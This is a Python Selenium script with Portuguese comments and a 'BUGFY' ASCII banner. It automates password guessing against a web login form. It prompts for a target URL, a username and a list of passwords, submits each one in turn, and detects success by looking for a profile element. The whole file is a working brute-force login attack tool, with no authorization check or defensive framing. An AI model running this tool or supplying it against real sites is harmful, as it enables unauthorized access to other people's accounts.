from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.keys import Keys
import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.firefox import GeckoDriverManager  # Instala automaticamente o GeckoDriver

# Exibindo a arte ASCII
print("""
  ____       _   _       ____      _____      __   __
 | __ )     | | | |     / ___|    |  ___|    \ \ / /
 |  _ \     | | | |    | |  _     | |__       \ V /  
 | |_) |    | |_| |    | |_| |    |  __|       | |    
 |____/     |_____|     \____|    |_|          |_|    
""")

# Perguntar ao usuário pela URL, nome de usuário e senhas a serem testadas
login_url = input("Digite a URL do formulário de login: ")
username = input("Digite o nome de usuário: ")

# Perguntar as senhas
password_input = input("Digite as senhas separadas por vírgula: ")
password_list = [senha.strip() for senha in password_input.split(',')]

# Usar o GeckoDriverManager para obter o GeckoDriver automaticamente
service = Service(GeckoDriverManager().install())  # Instala e configura automaticamente o GeckoDriver

# Iniciar o WebDriver com o Service para Firefox
driver = webdriver.Firefox(service=service)

# Acessar a página de login
driver.get(login_url)

# Esperar a página carregar completamente
WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'username')))  # Esperar até o campo de nome de usuário aparecer

# Encontrar os campos de login (usuário e senha) e o botão de login
username_field = driver.find_element(By.NAME, 'username')
password_field = driver.find_element(By.NAME, 'password')
login_button = driver.find_element(By.XPATH, '//button[@type="submit"]')

# Loop para tentar todas as senhas da lista
for senha in password_list:
    print(f"Tentando senha: {senha}")
    
    # Limpar campos antes de preencher
    username_field.clear()
    password_field.clear()

    # Preencher os campos de login
    username_field.send_keys(username)
    password_field.send_keys(senha)
    
    # Enviar o formulário de login (clicar no botão)
    login_button.click()

    # Esperar a página carregar após o clique no botão de login
    time.sleep(3)  # Dê um tempo para garantir que a página foi atualizada

    try:
        # Esperar um elemento específico da página de perfil, como o botão de perfil ou um menu, estar visível
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//span[@aria-label='Perfil']")))

        print(f"Login bem-sucedido com a senha: {senha}")
        break  # Se o login for bem-sucedido, sai do loop

    except Exception as e:
        # Se o login não foi bem-sucedido, recarregar a página e tentar novamente
        print(f"Tentativa falhou com a senha: {senha}")
        
        # Recarregar a página para limpar os campos
        driver.refresh()

        # Esperar a página ser recarregada e os campos estarem prontos
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'username')))
        
        # Re-encontrar os elementos após a recarga da página
        username_field = driver.find_element(By.NAME, 'username')
        password_field = driver.find_element(By.NAME, 'password')
        login_button = driver.find_element(By.XPATH, '//button[@type="submit"]')

        print("Página recarregada, tentando próxima senha.")

else:
    print("Todas as tentativas falharam.")

# Fechar o navegador após o processo
driver.quit()
